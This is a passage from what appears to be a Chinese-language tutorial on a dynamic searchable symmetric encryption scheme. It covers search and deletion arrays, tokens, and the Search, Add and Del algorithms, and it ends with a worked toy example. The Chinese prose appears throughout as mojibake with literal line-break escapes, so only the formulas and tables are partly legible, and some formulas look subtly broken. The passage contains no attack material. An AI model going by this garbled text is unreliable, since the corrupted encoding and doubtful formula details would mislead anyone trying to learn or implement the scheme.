éæ‰¿è¯ºæ€§ï¼ˆnon-committinï¼‰ï¼šå³æ–¹æ¡ˆçš„å¯†æ–‡å’Œå®‰å…¨å‚æ•°ä¸éšæœºæ•°æ˜¯ä¸å¯åŒºåˆ†çš„ï¼\n\nç„¶è€Œï¼Œç¬¬äºŒä¸ªé™åˆ¶å°±ä¸é‚£ä¹ˆå®¹æ˜“å…‹æœäº†ã€‚éš¾ç‚¹åœ¨äºæ–‡ä»¶çš„æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹éœ€è¦æœåŠ¡å™¨åœ¨å­˜å‚¨åœ¨$A_{s}$ä¸­çš„åŠ å¯†åˆ—\n\nè¡¨ä¸­æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹èŠ‚ç‚¹ã€‚    è¿™å¯¹äºæœåŠ¡å™¨æ¥è¯´å¾ˆéš¾åšåˆ°ï¼Œå› ä¸ºï¼š\n\nâ€‹    ï¼ˆ1ï¼‰å½“åˆ é™¤æ–‡ä»¶ $f$ æ—¶ï¼Œå®ƒä¸çŸ¥é“ï¼ˆåœ¨Aä¸­ï¼‰ä¸ $f$ å¯¹åº”çš„èŠ‚ç‚¹å­˜å‚¨åœ¨å“ªé‡Œï¼›\n\nâ€‹    ï¼ˆ2ï¼‰å½“ä»åˆ—è¡¨ä¸­æ’å…¥æˆ–åˆ é™¤ä¸€ä¸ªèŠ‚ç‚¹æ—¶ï¼Œå®ƒä¸èƒ½ä¿®æ”¹å‰ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œå› ä¸ºå®ƒæ˜¯åŠ å¯†çš„ï¼›\n\nâ€‹    ï¼ˆ3ï¼‰æ·»åŠ ä¸€ä¸ªèŠ‚ç‚¹åï¼Œå®ƒä¸çŸ¥é“ $A_{s}$ ä¸­å“ªäº›ä½ç½®æ˜¯ç©ºé—²çš„ã€‚\n\nâ€‹    åœ¨é«˜å±‚æ¬¡ä¸Šï¼Œæˆ‘ä»¬å¤„ç†è¿™äº›é™åˆ¶å¦‚ä¸‹ï¼š\n\n1. ï¼ˆæ–‡ä»¶åˆ é™¤ï¼‰æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªé¢å¤–çš„ï¼ˆåŠ å¯†çš„ï¼‰æ•°æ®ç»“æ„$A_{d}$ï¼Œç§°ä¸ºåˆ é™¤æ•°ç»„ï¼ŒæœåŠ¡å™¨å¯ä»¥æŸ¥è¯¢ï¼ˆé€šè¿‡å®¢æˆ·ç«¯æä¾›çš„ä»¤ç‰Œï¼‰ï¼Œä»¥æ¢å¤æŒ‡å‘è¢«åˆ é™¤æ–‡ä»¶å¯¹åº”èŠ‚ç‚¹çš„æŒ‡é’ˆã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œåˆ é™¤æ•°ç»„ä¸ºæ¯ä¸ªæ–‡ä»¶å­˜å‚¨ä¸€ä¸ªæŒ‡å‘ $A_{s}$ ä¸­çš„èŠ‚ç‚¹çš„èŠ‚ç‚¹åˆ—è¡¨ï¼Œå¦‚æœæ–‡ä»¶ $f$ è¢«åˆ é™¤ï¼Œè¿™äº›èŠ‚ç‚¹åº”è¯¥è¢«åˆ é™¤ã€‚æ‰€ä»¥æœç´¢æ•°ç»„ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹åœ¨åˆ é™¤æ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„èŠ‚ç‚¹ï¼Œåˆ é™¤æ•°ç»„ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½æŒ‡å‘æœç´¢æ•°ç»„ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ã€‚åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†æŠŠè¿™æ ·çš„èŠ‚ç‚¹ç§°ä¸ºå¯¹å¶ï¼Œå¹¶ç¼–å†™$N^*$ æ¥æŒ‡ä»£èŠ‚ç‚¹$N$çš„å¯¹å¶ã€‚\n\n2. ï¼ˆæŒ‡é’ˆä¿®æ”¹ï¼‰æˆ‘ä»¬ä½¿ç”¨åŒæ€åŠ å¯†æ–¹æ¡ˆå¯¹å­˜å‚¨åœ¨èŠ‚ç‚¹ä¸­çš„æŒ‡é’ˆè¿›è¡ŒåŠ å¯†ã€‚è¿™ç±»ä¼¼äº[23]ä¸­van Liesdonkç­‰äººç”¨æ¥ä¿®æ”¹ä»–ä»¬æ„é€ çš„åŠ å¯†æœç´¢ç»“æ„çš„æ–¹æ³•ã€‚é€šè¿‡å‘æœåŠ¡å™¨æä¾›é€‚å½“å€¼çš„åŠ å¯†ï¼Œå®ƒå°±å¯ä»¥ä¿®æ”¹æŒ‡é’ˆï¼Œè€Œä¸éœ€è¦è§£å¯†èŠ‚ç‚¹ã€‚æˆ‘ä»¬ä½¿ç”¨â€œæ ‡å‡†â€å¯¹ç§°åŠ å¯†æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆåŒ…æ‹¬å°†æ¶ˆæ¯ä¸PRFçš„è¾“å‡ºè¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚è¿™ä¸ªç®€å•çš„æ„é€ è¿˜æœ‰ä¸€ä¸ªä¼˜ç‚¹ï¼Œå³ä¸æäº¤ï¼ˆåœ¨ç§æœ‰å¯†é’¥è®¾ç½®ä¸­ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªä¼˜ç‚¹æ¥å®ç°CKA2å®‰å…¨æ€§ã€‚\n\n3. ï¼ˆå†…å­˜ç®¡ç†ï¼‰ä¸ºäº†è·Ÿè¸ª$A_{s}$ä¸­çš„å“ªäº›ä½ç½®æ˜¯ç©ºé—²çš„ï¼Œæˆ‘ä»¬æ·»åŠ å¹¶ç®¡ç†é¢å¤–çš„ç©ºé—´ï¼ŒåŒ…æ‹¬æœåŠ¡å™¨ç”¨æ¥æ·»åŠ æ–°èŠ‚ç‚¹çš„freeåˆ—è¡¨ã€‚\n\n## 4ã€å…·ä½“å®ç°\n\n### Prepare\n\n$$\nDSSE=(Gen,Enc,SrchToken,AddToken,DelToken,Search,Add,Del,Dec)\n$$\n\n| åºå· |                      ç®—æ³•                      |       æè¿°       |\n| :--: | :--------------------------------------------: | :--------------: |\n|  â‘    |            $K\\leftarrow Gen(1^{k})$            |   å¯†é’¥ç”Ÿæˆç®—æ³•   |\n|  â‘¡   |        $(\\gamma,c)\\leftarrow Enc(K,f)$         |   ç´¢å¼•ç”Ÿæˆç®—æ³•   |\n|  â‘¢   |      $\\tau_{s}\\leftarrow SrchToken(K,w)$       |   é™·é—¨ç”Ÿæˆç®—æ³•   |\n|  â‘£   |   $(\\tau_{a},c_{f})\\leftarrow AddToken(K,f)$   | æ·»åŠ ä»¤ç‰Œç”Ÿæˆç®—æ³• |\n|  â‘¤   |      $\\tau_{d} \\leftarrow DelToken(K,f)$       | åˆ é™¤ä»¤ç‰Œç”Ÿæˆç®—æ³• |\n|  â‘¥   |       $I_{w}:=Search(\\gamma,c,\\tau_{s})$       |     æœç´¢ç®—æ³•     |\n|  â‘¦   | $(\\gamma',c'):=Add(\\gamma,c,\\tau_{a},c_{new})$ |   æ·»åŠ æ–‡ä»¶ç®—æ³•   |\n|  â‘§   |     $(\\gamma',c'):=Del(\\gamma,c,\\tau_{d})$     |   åˆ é™¤æ–‡ä»¶ç®—æ³•   |\n|  â‘¨   |                 $f:=Dec(K,c)$                  |     è§£å¯†ç®—æ³•     |\n\n\n\n|             ä¼ªéšæœºå‡½æ•°              |\n| :---------------------------------: |\n|  $F:\\{0,1\\}^kÃ—\\{0,1\\}^âˆ—â†’\\{0,1\\}^k$  |\n|  $G:\\{0,1\\}^kÃ—\\{0,1\\}^âˆ—â†’\\{0,1\\}^âˆ—$  |\n| $P:\\{0,1\\}^kÃ— \\{0,1\\}^âˆ—â†’ \\{0,1\\}^k$ |\n|           **éšæœºé¢„è¨€æœº**            |\n|     $H_1:\\{0,1\\}^âˆ—â†’ \\{0,1\\}^âˆ—$      |\n|      $H_2:\\{0,1\\}^âˆ—â†’\\{0,1\\}^âˆ—$      |\n\n\n\n|  ç¬¦å·   |   æè¿°   |\n| :-----: | :------: |\n|  $A_s$  | æœç´¢æ•°ç»„ |\n| $A_{d}$ | åˆ é™¤æ•°ç»„ |\n|  $T_s$  |  æœç´¢è¡¨  |\n| $T_{d}$ |  åˆ é™¤è¡¨  |\n\n\n\n### $Gen(1^k)$\n\n$$\nK = (K_1ï¼ŒK_2ï¼ŒK_3ï¼ŒK_4)â†\\{0, 1\\}^k\n$$\n\n### $Enc(K,f)$\n\n1. è®¾ $A_s$ å’Œ $A_d$ ä¸ºå¤§å°ä¸º $|c|/8 +z$ çš„æ•°ç»„ï¼Œè®¾ $T_s$ å’Œ $T_d$ åˆ†åˆ«ä¸ºå¤§å°ä¸º $\\#W$ å’Œ $\\#f$ çš„å­—å…¸ã€‚æˆ‘ä»¬å‡è®¾ **0** æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º$(log\\#A_s)$çš„ 0 å­—ç¬¦ä¸²ï¼Œfree æ˜¯ä¸€ä¸ªä¸åœ¨ $W$ ä¸­çš„å•è¯\n\n- è®¾ $zâˆˆN$ ä¸º $free \\ list$ çš„åˆå§‹å¤§å°\n\n2. for $wâˆˆW$\n\nåˆ›å»ºä¸€ä¸ªåˆ—è¡¨ $L_w$ åŒ…å« $\\#f_w$ ä¸ªèŠ‚ç‚¹ $(N_1ï¼Œâ€¦ï¼ŒN_\\#f_w)$  å­˜å‚¨åœ¨æœç´¢æ•°ç»„ $A_s$ çš„éšæœºä½ç½®ï¼Œå¹¶å®šä¹‰ä¸º\n$$\nN_i:= (ã€ˆid_i,addr_s(N_{i+1})ã€‰âŠ•H_1(K_w, r_i),r_i)\n$$\n\n- å…¶ä¸­ $id_i$ æ˜¯ $f_w$ ä¸­ç¬¬ i ä¸ªæ–‡ä»¶çš„ IDï¼Œ$r_i$ æ˜¯éšæœºç”Ÿæˆçš„ $k-bit$ ä¸²ï¼Œ$K_w:=P_{K_3}(w)$ , $addr_s(N_\\#f_{w+1}) =0$\n\n\n\né€šè¿‡è®¾ç½® $T_s[F_{K_1}(w)] :=ã€ˆaddr_s(N_1),addr_d(N^â‹†_1)ã€‰âŠ•G_{K_2}(w)$ å­˜å‚¨ä¸€ä¸ªæŒ‡å‘æœç´¢è¡¨ä¸­ $L_w$ çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ\n\n- å…¶ä¸­ $N^*$ æ˜¯ N çš„å¯¹å¶ï¼Œå³$A_d$ ä¸­çš„èŠ‚ç‚¹ï¼Œå…¶ç¬¬å››ä¸ªå…¥å£æŒ‡å‘$A_s$ä¸­çš„ $N_1$ã€‚\n\n3. for $fâˆˆ\\rm f$ \n\nåˆ›å»ºä¸€ä¸ªåˆ—è¡¨ $L_f$ åŒ…å« $\\#f$ ä¸ªèŠ‚ç‚¹$(D_1ï¼Œâ€¦ï¼ŒD_\\#f_w)$ å­˜å‚¨åœ¨æœç´¢æ•°ç»„ $A_d$ çš„éšæœºä½ç½®ï¼Œå¹¶å®šä¹‰ä¸º\n\n$D_i:= (ã€ˆaddr_d(D_{i+1}),addr_d(N^â‹†_{âˆ’1}),addr_d(N^â‹†_{+1}),addr_s(N),addr_s(N_{âˆ’1}),addr_s(N_{+1}),F_{K_1}(w)ã€‰âŠ• H_2(K_f, r^â€²_i), r^â€²_i)$\n\n- å…¶ä¸­ $r'_i$ æ˜¯éšæœºç”Ÿæˆçš„ k-bit ä¸²ï¼Œ$K_f:=P_{K_3}(f)$ ï¼Œ $addr_d(D_\\#f_{w+1}) =0$\n- æ¯ä¸ªæ¡ç›®$D_i$éƒ½ä¸ä¸€ä¸ªå•è¯ $w$ ç›¸å…³ï¼Œå› æ­¤$L_w$ä¸­èŠ‚ç‚¹$N$ã€‚è®¾$N_{+1}$ä¸º$L_w$ä¸­$N$ä¹‹åçš„èŠ‚ç‚¹ï¼Œ$N_{-1}$ä¸º$L_w$ä¸­$N$ä¹‹å‰çš„èŠ‚ç‚¹\n\n\n\né€šè¿‡è®¾ç½® $T_d[F_{K_1}(f)] :=addr_d(D_1)âŠ•G_{K_2}(f)$ï¼Œåœ¨åˆ é™¤è¡¨ä¸­å­˜å‚¨ä¸€ä¸ªæŒ‡å‘ $L_f$ çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ\n\n4. é€šè¿‡åœ¨ $A_s$ å’Œ $A_d$ ä¸­éšæœºé€‰æ‹© $z$ ä¸ªæœªä½¿ç”¨çš„å•å…ƒæ ¼ï¼Œåˆ›å»ºä¸€ä¸ªæœªåŠ å¯†çš„ç©ºé—²åˆ—è¡¨ $L_{free}$ï¼Œè®©$(F_1ï¼Œâ€¦ï¼ŒF_z)$å’Œ$(F'_1ï¼Œâ€¦ï¼ŒF'_z)$åˆ†åˆ«ä¸º $A_s$ å’Œ $A_d$ ä¸­çš„ç©ºé—²èŠ‚ç‚¹ã€‚è®¾ç½® $T_s[free] :=ã€ˆaddr_s(F_z),0^{log}\\#Aã€‰$\n\nfor $zâ‰¤iâ‰¤1$, è®¾ç½® $A_s[addr_s(F_i)] :=0^{log}\\#f,addr_s(F_{iâˆ’1}),addr_d(F^â€²_i)$  å…¶ä¸­ $addr_s(F_0) =0^{log}\\#A$\n\n5. ç”¨éšæœºå­—ç¬¦ä¸²å¡«å……$A_S$ å’Œ $A_d$ çš„å…¶ä½™æ¡ç›®\n\n6. å¯¹äº $1â‰¤iâ‰¤\\#f$ï¼Œä»¤ $c_iâ†SKE.Enc_{K4}(f_i)$\n\n7. è¾“å‡º $(Î³,c)$ , å…¶ä¸­ $Î³:= (A_s,T_s,A_d,T_d)$ å’Œ $c= (c_1, . . . , c_\\#f)$.\n\n### $SrchToken(K, w)$\n\n$$\nÏ„_s:=(F_{K_{1}}(w), G_{K_{2}}(w), P_{K_{3}}(w))\n$$\n\n### $Search(Î³,c, Ï„_s)$\n\n- å°† $Ï„_s$ è§£æä¸º $(Ï„_1ï¼Œ Ï„_2ï¼Œ Ï„_3)$ï¼Œå¦‚æœ $Ï„_1$ åœ¨ $T_s$ ä¸­ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›ç©ºåˆ—è¡¨ã€‚\n\n- é€šè¿‡è®¡ç®— $(Î±_1ï¼Œ Î±'_1):=T_s[Ï„_1]âŠ•Ï„_2$ æ¢å¤æŒ‡å‘åˆ—è¡¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ\n- æŸ¥æ‰¾ $N_1:=A[Î±_1]$ å¹¶ç”¨ $Ï„_3$ è¿›è¡Œè§£å¯†ï¼Œ\n- å³å°† $N_1$ è§£æä¸º $(Î½_1, r_1)$ å¹¶è®¡ç®—$(id_1,0,addr_s(N_2)):=Î½_1âŠ•H_1(Ï„_3, r_1)$\n- å¯¹äº $iâ‰¥2$ï¼Œè§£å¯†èŠ‚ç‚¹ $N_i$ï¼Œç›´åˆ° $Î±_{i+1}=0$\n- è®¾ $I={id_1ï¼Œâ€¦ï¼Œid_m}$ ä¸ºå‰é¢æ­¥éª¤ä¸­æ˜¾ç¤ºçš„æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œå¹¶è¾“å‡º$\\{c_i\\}_{iâˆˆI}$ï¼Œå³æ˜¾ç¤ºæ ‡è¯†ç¬¦çš„æ–‡ä»¶çš„åŠ å¯†\n\n### $AddToken(K, f)$\n\nè®© $(w_1,â€¦,w_\\#f)$ æ˜¯ $f$ ä¸­å…³é”®è¯ã€‚è®¡ç®— $Ï„_a:=(F_{K_{1}}(f), G_{K_{2}}(f), Î»_1,. . .,Î»_\\#f)$ï¼Œå¯¹äºæ‰€æœ‰ $1â‰¤iâ‰¤\\#f$\n\n$Î»_i:= (F_{K_{1}}(w_i), G_{K_{2}}(w_i),ã€ˆid(f),0ã€‰ âŠ•H_1(P_{K_3}(w_i), r_i), r_i,ã€ˆ0,0,0,0,0,0, F_{K_{1}}(w_1ã€‰ âŠ•H_2(P_{K_3}(f), r^â€²_i), r^â€²_i)$\n\n- $r_i$ å’Œ $r'_i$ æ˜¯éšæœºä½å­—ç¬¦ä¸²ã€‚ä»¤ $c_fâ†SKE.Enc_{K_4}(f)$ \n- è¾“å‡º $(Ï„_a, c_f)$\n\n### $Add(Î³,c, Ï„_a)$\n\n1. å°† $Ï„_a$ è§£æä¸º$(Ï„_1,Ï„_2, Î»_1,. . .,Î»_\\#f)$ï¼Œå¦‚æœ $Ï„_1$ ä¸åœ¨ $T_s$ å†…ï¼Œåˆ™æ˜¯âŠ¥(æ— æ³•è¿ç®—)\n\n2. å¯¹äº $1â‰¤iâ‰¤\\#f$\n\n- è®¡ç®— $(Ï†,0) :=T_s[free],  (Ï†_{âˆ’1}, Ï†^â‹†) :=A_s[Ï†]$ æ‰¾åˆ°æœç´¢æ•°ç»„ä¸­æœ€åä¸€ä¸ªç©ºé—²ä½ç½® $Ï†$ å’Œåˆ é™¤æ•°ç»„ä¸­å¯¹åº”å…¥å£ $Ï†^*$\n- é€šè¿‡è®¾ç½® $T_s[free]:= (Ï†_{âˆ’1},0)$ï¼Œæ›´æ–°æœç´¢è¡¨ä»¥æŒ‡å‘å€’æ•°ç¬¬äºŒä¸ªç©ºé—²æ¡ç›®\n- é€šè¿‡è®¡ç®— $(Î±_1,Î±^*_1):=T_s[Î»_i[1]]âŠ•Î»_i[2]$ æ¢å¤æŒ‡å‘åˆ—è¡¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ $N_1$ çš„æŒ‡é’ˆ\n- å°†æ–°èŠ‚ç‚¹å­˜å‚¨åœ¨ä½ç½® $Ï†$ å¤„ï¼Œå¹¶é€šè¿‡è®¾ç½®$A_s[Ï†]:=(Î»_i[3]âŠ•< 0ï¼ŒÎ±_1 >ï¼Œ Î»_i[4])$å°†å…¶å‰å‘æŒ‡é’ˆä¿®æ”¹ä¸º$N_1$\n\n- æ›´æ–°æœç´¢è¡¨  $T_s[Î»_i[1]]:=(Ï†, Ï†^â‹†)âŠ•Î»_i[2]$\n- æ›´æ–° $N_1$çš„å¯¹å¶  $A_d[Î±^â‹†_1] :=(D_1âŠ•ã€ˆ0, Ï†^â‹†,0,0,Ï†,0,0ã€‰, r)$ï¼Œå…¶ä¸­ $(D_1,r) :=A_d[Î±^â‹†_1]$\n\n- æ›´æ–°$A_s[Ï†]$çš„å¯¹å¶ $A_d[Ï†^â‹†]:=(Î»_i[5]âŠ•ã€ˆÏ†^â‹†_{âˆ’1},0, Î±^â‹†_1,Ï†,0, Î±_1, Î»_i[1]ã€‰, Î»_i[6])$\n\n- å¦‚æœ i = 1ï¼Œåˆ™æ›´æ–°åˆ é™¤è¡¨  $T_d[Ï„_1] :=ã€ˆÏ†^â‹†,0ã€‰âŠ•Ï„_2$\n\n\n3. æ›´æ–°å¯†æ–‡ï¼Œå°†æ–°å¯†æ–‡ $c_{new}$ åŠ å…¥ $c$\n\n### $DelToken(K, f)$\n\n$$\nÏ„_d:= (F_{K_{1}}(f), G_{K_{2}}(f), P_{K_{3}}(f),id(f))\n$$\n\n### $Del(Î³,c, Ï„_d)$\n\n1. å°† $Ï„_d$ è§£æä¸º $(Ï„_1,Ï„_2,Ï„_3,id)$ï¼Œå¦‚æœ $Ï„_1$ ä¸åœ¨ $T_d$ å†…ï¼Œåˆ™æ˜¯âŠ¥(ç»ˆæ­¢)\n\n2. æ‰¾åˆ° $L_f$ çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ $Î±^â€²_1:=T_d[Ï„_1]âŠ•Ï„_2$\n\n3. å¯¹äº $1â‰¤iâ‰¤\\#f$\n\n   - è§£å¯† $D_i$ ,  $(Î±_1, . . . , Î±_6, Î¼) :=D_iâŠ•H_2(Ï„_3, r)$, å…¶ä¸­  $(D_i, r) :=A_d[Î±^â€²_i]$\n\n   - åˆ é™¤ $D_i$ï¼Œ $A_d[Î±^â€²_i]$ ä¸ºä¸€ä¸ªéšæœº ($6 log \\#(A+k)0$)-bit å­—ç¬¦ä¸²\n\n   - æ‰¾åˆ°æœ€åä¸€ä¸ªç©ºé—²èŠ‚ç‚¹ $(Ï†,0^{log}\\#A) :=T_s[free]$\n\n   -  ä½¿æœç´¢è¡¨ä¸­çš„ free æ¡ç›®æŒ‡å‘$D_i$çš„å¯¹å¶ $T_s[free]:=ã€ˆÎ±_4,0^{log}\\#Aã€‰$\n\n   - $D_i$ å¯¹å¶çš„ çš„è‡ªç”±ä½ç½® $As[Î±_4] := (Ï†, Î±^â€²_i)$ \n\n- è®©$N_{-1}$æˆä¸º $D_i$ å¯¹å¶ä¹‹å‰çš„èŠ‚ç‚¹ï¼Œæ›´æ–° $N_{-1}$ çš„ next æŒ‡é’ˆ by settingï¼š\n- $A_s[Î±_5] := (Î²_1, Î²_2âŠ•Î±_4âŠ•Î±_6, r_{âˆ’1})$ï¼Œå…¶ä¸­ $(Î²_1, Î²_2, r_{âˆ’1}) :=A_s[Î±_5]$ \n- æ­¤å¤– æ›´æ–° $N_{-1}$çš„å¯¹å¶æŒ‡é’ˆ by setting:\n- $A_d[Î±_2] := (Î²_1, Î²_2, Î²_3âŠ•Î±^â€²_iâŠ•Î±_3, Î²_4, Î²_5, Î²_6âŠ•Î±_4âŠ•Î±_6, Î¼^âˆ—, r^âˆ—_{-1})$,where $(Î²_1, . . . , Î²_6, Î¼^âˆ—, r^âˆ—_{-1}) :=A_d[Î±_2]$\n- è®©$N_{+1}$æˆä¸ºè·Ÿéš Di çš„å¯¹å¶çš„èŠ‚ç‚¹ï¼Œæ›´æ–° $N_{+1}$çš„å¯¹å¶æŒ‡é’ˆ by setting:\n- $A_d[Î±_3] := (Î²_1, Î²_2âŠ•Î±^â€²_iâŠ•Î±_2, Î²_3, Î²_4, Î²_5âŠ•Î±_4âŠ•Î±_5, Î²_6, Î¼^âˆ—, r^âˆ—_{+1})$ï¼Œå…¶ä¸­ $(Î²_1, . . . , Î²_6, Î¼^âˆ—, r^âˆ—_{+1}) :=A_d[Î±_3]$\n\n- set $Î±^â€²_{i+1}:=Î±_1$\n\n- 4.ä» $c$ ä¸­åˆ é™¤ $id$ å¯¹åº”çš„å¯†æ–‡\n- 5.ä»$T_d$ä¸­å»é™¤$Ï„_1$\n\n### $Dec(K, c)$\n\n$$\nm:=SKE.Dec_{K4}(c)\n$$\n\n\n\n\n\n### è¯´æ˜æ€§ä¾‹å­\n\nå›¾1æ¼”ç¤ºäº†åŒ…å«3ä¸ªæ–‡ä»¶å’Œ3ä¸ªå•è¯çš„ç©å…·ç´¢å¼•ä¸Šçš„åŠ¨æ€SSEæ•°æ®ç»“æ„ã€‚\n\n![](https://img.jwt1399.top/img/202211191913253.png)\n\nè¯¥ç´¢å¼•åŸºäºä¸‰ä¸ªæ–‡æ¡£ï¼Œå³$f_{1}$ã€$f_{2}$ã€$f_{3}$ï¼ŒåŸºäºä¸‰ä¸ªå…³é”®è¯ï¼Œå³ $w_{1}$ã€$w_{2}$ã€$w_{3}$ã€‚æ‰€æœ‰æ–‡æ¡£éƒ½åŒ…å«å…³é”®å­— $w_{1}$ï¼Œå…³é”®å­—$w_{2}$ä»…åŒ…å«åœ¨æ–‡æ¡£ $f_{2}$ ä¸­ï¼Œè€Œ $w_{3}$ åŒ…å«åœ¨æ–‡æ¡£ $f_{2}$ å’Œ $f_{3}$ ä¸­ã€‚\n\nå›¾1ä¸­è¿˜ç¤ºå‡ºäº†ç›¸åº”çš„æœç´¢è¡¨$T_{s}$ã€åˆ é™¤è¡¨ $T_{d}$ã€æœç´¢æ•°ç»„ $A_{s}$ å’Œåˆ é™¤æ•°ç»„ $A_{d}$ã€‚\n\næ³¨æ„ï¼Œåœ¨çœŸå®çš„DSSEç´¢å¼•ä¸­ï¼Œä¼šæœ‰å¡«å……æ¥éšè—æ–‡ä»¶å•è¯å¯¹çš„æ•°é‡ï¼›åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬çœç•¥äº†è¿™ä¸ªå¡«å……ã€‚\n\n**æœç´¢**ã€‚æœç´¢æ˜¯æˆ‘ä»¬æ–¹æ¡ˆä¸­æœ€ç®€å•çš„æ“ä½œã€‚\n\nå‡è®¾å®¢æˆ·å¸Œæœ›æœç´¢åŒ…å«å…³é”®å­—$w_{1}$çš„æ‰€æœ‰æ–‡æ¡£ã€‚ä»–å‡†å¤‡æœç´¢ä»¤ç‰Œï¼Œå…¶ä¸­åŒ…å« $F_{K_{1}}(w)$ å’Œ$G_{K_{2}}(w)$ã€‚ç¬¬ä¸€å€¼ $F_{K_{1}}(w)$ å’Œå°†ä½¿æœåŠ¡å™¨èƒ½å¤Ÿåœ¨æœç´¢è¡¨$T_{s}$ä¸­å®šä½å¯¹åº”äºå…³é”®å­—$w_{1}$çš„æ¡ç›®ã€‚\n\nåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œè¿™ä¸ªå€¼æ˜¯$x=(4âˆ£âˆ£1)\\oplus G_{K_{2}}(w)$ã€‚æœåŠ¡å™¨ç°åœ¨ä½¿ç”¨ç¬¬äºŒä¸ªå€¼ å’Œ$G_{K_{2}}(w)$æ¥è®¡ç®—$x\\oplus G_{K_{2}}(w)$ã€‚è¿™å°†å…è®¸æœåŠ¡å™¨åœ¨æœç´¢æ•°ç»„ä¸­å®šä½æ­£ç¡®çš„æ¡ç›®ï¼ˆåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­æ˜¯4ä¸ªï¼‰ï¼Œå¹¶å¼€å§‹â€œæš´éœ²â€å­˜å‚¨æŒ‡å‘åŒ…å«$w_{1}$çš„æ–‡æ¡£çš„æŒ‡é’ˆçš„ä½ç½®ã€‚è¿™ç§å»å±è”½æ˜¯é€šè¿‡æœç´¢ä»¤ç‰Œä¸­åŒ…å«çš„ç¬¬ä¸‰ä¸ªå€¼æ¥æ‰§è¡Œçš„ã€‚\n\n\n\n**æ·»åŠ æ–‡æ¡£**ã€‚å‡è®¾ç°åœ¨å®¢æˆ·å¸Œæœ›æ·»åŠ åŒ…å«å…³é”®å­—$w_{1}$å’Œ$w_{2}$çš„æ–‡æ¡£$f_{4}$ã€‚è¯·æ³¨æ„ï¼Œæœç´¢è¡¨æ ¹æœ¬æ²¡æœ‰æ”¹å˜ï¼Œå› ä¸º$f_{4}$æ­£åœ¨è¿›è¡Œæˆä¸ºå…³é”®å­—$w_{1}$å’Œ$w_{2}$åˆ—è¡¨ä¸­çš„æœ€åä¸€ä¸ªæ¡ç›®ï¼Œå¹¶ä¸”æœç´¢è¡¨ä»…å­˜å‚¨å‰å‡ ä¸ªæ¡ç›®ã€‚ç„¶è€Œï¼Œæ‰€æœ‰å…¶ä»–æ•°æ®ç»“æ„å¿…é¡»ä»¥ä¸‹åˆ—æ–¹å¼æ›´æ–°ã€‚é¦–å…ˆï¼ŒæœåŠ¡å™¨ä½¿ç”¨æ— éœ€å¿«é€Ÿæ£€ç´¢æœç´¢æ•°ç»„ä¸­â€œç©ºé—²â€ä½ç½®çš„ç´¢å¼•ï¼Œæ–°æ¡ç›®å°†å­˜å‚¨åœ¨è¿™äº›ä½ç½®ã€‚\n\nåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œè¿™äº›ä½ç½®æ˜¯2å’Œ6ã€‚æœåŠ¡å™¨åœ¨è¿™äº›æ¡ç›®ä¸­å­˜å‚¨æ–°ä¿¡æ¯$(w_{1}ï¼Œf_{4})$å’Œ$(w_{2},f_{4})$ã€‚ç°åœ¨ï¼ŒæœåŠ¡å™¨éœ€è¦å°†è¿™ä¸ªæ–°æ¡ç›®è¿æ¥åˆ°ç›¸åº”çš„å…³é”®å­—åˆ—è¡¨ï¼šä½¿ç”¨addä»¤ç‰Œï¼Œå®ƒåœ¨æœç´¢æ•°ç»„ä¸­æ£€ç´¢å…ƒç´ xå’Œyçš„ç´¢å¼•$i = 0$å’Œj = 3ï¼Œä½¿å¾—xå’Œyå¯¹åº”äºå…³é”®å­—åˆ—è¡¨$w_{1}$å’Œ$w_{2}$çš„æœ€åæ¡ç›®ã€‚è¿™æ ·ï¼ŒæœåŠ¡å™¨åŒæ€åœ°å°†$A_{s}\\left[ 0 \\right]$å’Œ$A_{s}\\left[ 3 \\right]$çš„â€œä¸‹ä¸€ä¸ªâ€æŒ‡é’ˆè®¾ç½®ä¸ºæŒ‡å‘æ–°æ·»åŠ çš„èŠ‚ç‚¹ï¼Œè¿™äº›èŠ‚ç‚¹å·²ç»å­˜å‚¨åœ¨æœç´¢æ•°ç»„çš„ä½ç½®2å’Œ6ã€‚\n\n\n\næ³¨æ„ï¼Œè®¿é—®æœç´¢æ•°ç»„ä¸­çš„ç©ºé—²æ¡ç›®ä¹Ÿæä¾›äº†å¯¹åˆ é™¤æ•°ç»„$A_d$çš„ç›¸åº”ç©ºé—²ä½ç½®çš„è®¿é—®ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œåˆ é™¤æ•°ç»„ä¸­ç©ºé—²ä½ç½®çš„ç´¢å¼•æ˜¯3å’Œ7ã€‚æœåŠ¡å™¨å°†åœ¨åˆ 